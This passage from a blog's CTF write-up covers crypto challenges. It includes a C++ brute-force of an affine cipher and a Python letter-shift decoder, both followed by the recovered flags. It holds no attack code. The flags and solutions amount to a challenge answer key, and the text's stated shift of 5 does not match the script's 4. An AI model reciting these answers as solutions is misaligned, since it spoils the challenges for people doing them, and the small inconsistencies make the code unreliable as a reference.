+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;So_easy_RSA_and_DES&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="贝叶斯"><a href="#贝叶斯" class="headerlink" title="贝叶斯"></a>贝叶斯</h3><p>打开是一个密码本 需要解密 仿射密码</p>
+<p>脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">int gcd(int m, int n);</span><br><span class="line">int init_gcd(int m, int n);</span><br><span class="line">int des_find(string p, int m);</span><br><span class="line"></span><br><span class="line">#define PSIZE 65   //宏定义密码表大小</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  string P(&quot;zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert&#123;yuiop&#125;0123498765&quot;), M(&quot;gf9C&#123;YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7&quot;);   //明文空间，与已知密文</span><br><span class="line">  string C;  //存放解密明文</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  int i = 2;   //求解所有互素的数</span><br><span class="line">  int a1;  //存放逆元</span><br><span class="line"></span><br><span class="line">  for (i; i &lt; PSIZE; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    if (gcd(i, PSIZE) == 1)</span><br><span class="line">    &#123;  //说明此时的i与28互素</span><br><span class="line">      /***求解此时的i的逆元***/</span><br><span class="line">      a1 = init_gcd(i, PSIZE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      for (int j = 0; j &lt; PSIZE; j++)   //控制b的遍历</span><br><span class="line">      &#123;</span><br><span class="line">        cout &lt;&lt; &quot;此时：a=&quot; &lt;&lt; i &lt;&lt; &quot; b=&quot; &lt;&lt; j &lt;&lt; &quot; a的逆元为：&quot; &lt;&lt; a1 &lt;&lt; &quot;   \&quot;&quot;;</span><br><span class="line">        for (int k = 0; k &lt; M.length(); k++) &#123;     //每一个汉字站两个字节，所以要用两个数组空间来存</span><br><span class="line">          int where = des_find(P, M[k]);   //匹配密文在明文空间的位置</span><br><span class="line">          where = ((where - j)*a1) % PSIZE;</span><br><span class="line">          if (where &lt; 0) &#123;</span><br><span class="line">            where += PSIZE;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          cout &lt;&lt; P[where];</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; &quot;\&quot;&quot; &lt;&lt; endl;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int gcd(int b, int a)    //求互素</span><br><span class="line">&#123;</span><br><span class="line">  int temp;</span><br><span class="line">  if (a &lt; b)//判断大小</span><br><span class="line">  &#123;</span><br><span class="line">    temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  if (b == 0) return a;</span><br><span class="line">  else return gcd(b, a%b);//递归</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int init_gcd(int m, int n)   //扩展欧几里得算法</span><br><span class="line">&#123;</span><br><span class="line">  int i = 2;</span><br><span class="line">  for (i; i &lt; 28; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    if ((m*i) % n == 1)</span><br><span class="line">    &#123;</span><br><span class="line">      return i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int des_find(string p, int m)   //位置匹配函数</span><br><span class="line">&#123;</span><br><span class="line">  for (int i = 0; i &lt; p.length(); i ++) &#123;</span><br><span class="line">    //cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl;</span><br><span class="line">    if (m == p[i]) &#123;</span><br><span class="line">      return  i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>跑出来  找到了flag</p>
+<p><img src="https://s2.ax1x.com/2019/04/10/ATevzd.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;I_10ve_Crypto_Yov_t0O_e8963F5&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="不会奔跑的数字和下划线"><a href="#不会奔跑的数字和下划线" class="headerlink" title="不会奔跑的数字和下划线"></a>不会奔跑的数字和下划线</h3><p>打开题目发现是 url加密</p>
+<p>加密之后  进行base16解密  最后进行base64解密</p>
+<p>得到 和flag长得相似的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEGXJ&#123;48_ter_119_xsoirw_teww&#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据题目 我们只考虑字母<br>发现这一些字符前五位和JACTF的ascii码相差5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;NEGXJ&#123;48_ter_119_xsoirw_teww&#125;&quot;</span><br><span class="line">str_2 = &quot;NEGXJterxsoirwteww&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">x = 4</span><br><span class="line">for i in str:</span><br><span class="line">	if i.isalpha():</span><br><span class="line">		flag += chr(int(ord(i)-x))</span><br><span class="line">	else:</span><br><span class="line">		flag += i</span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
+<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JACTF&#123;48_pan_119_tokens_pass&#125;</span><br></pre></td></tr></table></figure></p>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2019年04月10日 16:09</p>
+        <p>原始链接： <a class="post-url" href="/2019/04/10/掘安杯writeup/" title="2019掘安杯writeup">http://yoursite.com/2019/04/10/掘安杯writeup/</a></p>
+        <footer>
+            <a href="http://yoursite.com">
+                <img src="/images/logo.png" alt="chuddy">
+                chuddy
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;">赏</a>
+</div>
+
+<div id="reward" class="post-modal reward-lay">
+    <a class="close" href="javascript:;" id="reward-close">×</a>
+    <span class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我吃糖~
+        <i class="icon icon-quote-right"></i>
+    </span>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/images/wechat_code.jpg" alt="打赏二维码">
+        </div>
+        <div class="reward-select">
+            
+            <label class="reward-select-item checked" data-id="wechat" data-wechat="/images/wechat_code.jpg">
+                <img class="reward-select-item-wechat" src="/images/wechat.png" alt="微信">
+            </label>
+            
+            
+            <label class="reward-select-item" data-id="alipay" data-alipay="/images/alipay_code.jpg">
+                <img class="reward-select-item-alipay" src="/images/alipay.png" alt="支付宝">
+            </label>
+            
+        </div>
+    </div>
+</div>
+
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/04/10/掘安杯writeup/&title=《2019掘安杯writeup》 — chuddy's Blog&pic=http://yoursite.comimages/logo.png" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/04/10/掘安杯writeup/&title=《2019掘安杯writeup》 — chuddy's Blog&source=" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/04/10/掘安杯writeup/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019掘安杯writeup》 — chuddy's Blog&url=http://yoursite.com/2019/04/10/掘安杯writeup/&via=http://yoursite.com" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/04/10/掘安杯writeup/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/04/10/掘安杯writeup/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/CTF/" class="color4">CTF</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#掘安杯writeup"><span class="post-toc-text">掘安杯writeup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web"><span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web签到题"><span class="post-toc-text">web签到题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#下载下载"><span class="post-toc-text">下载下载</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜密码"><span class="post-toc-text">猜密码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#该网站已被黑"><span class="post-toc-text">该网站已被黑</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#not-easy"><span class="post-toc-text">not_easy</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#曲折的人生"><span class="post-toc-text">曲折的人生</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#audit"><span class="post-toc-text">audit</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#misc"><span class="post-toc-text">misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#misc签到"><span class="post-toc-text">misc签到</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#so-easy"><span class="post-toc-text">so_easy</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#这是什么玩意"><span class="post-toc-text">这是什么玩意</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#你对我的网站做了什么"><span class="post-toc-text">你对我的网站做了什么</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#小梳子"><span class="post-toc-text">小梳子</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#这不是真的图片"><span class="post-toc-text">这不是真的图片</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#该死的温柔"><span class="post-toc-text">该死的温柔</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#怀疑人生"><span class="post-toc-text">怀疑人生</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#签到题"><span class="post-toc-text">签到题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#罗马帝国的奠基者"><span class="post-toc-text">罗马帝国的奠基者</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#贝斯家族三英战群魔"><span class="post-toc-text">贝斯家族三英战群魔</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#绝密文件"><span class="post-toc-text">绝密文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#贝叶斯"><span class="post-toc-text">贝叶斯</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#不会奔跑的数字和下划线"><span class="post-toc-text">不会奔跑的数字和下划线</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+  
+    <a href="/2019/03/31/上海嘉韦思杯/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">2019年嘉韦思杯wp</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2019 chuddy<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "http://yoursite.com",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 1
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/web/">web</a><a class="category-link" href="/categories/writeup/">writeup</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
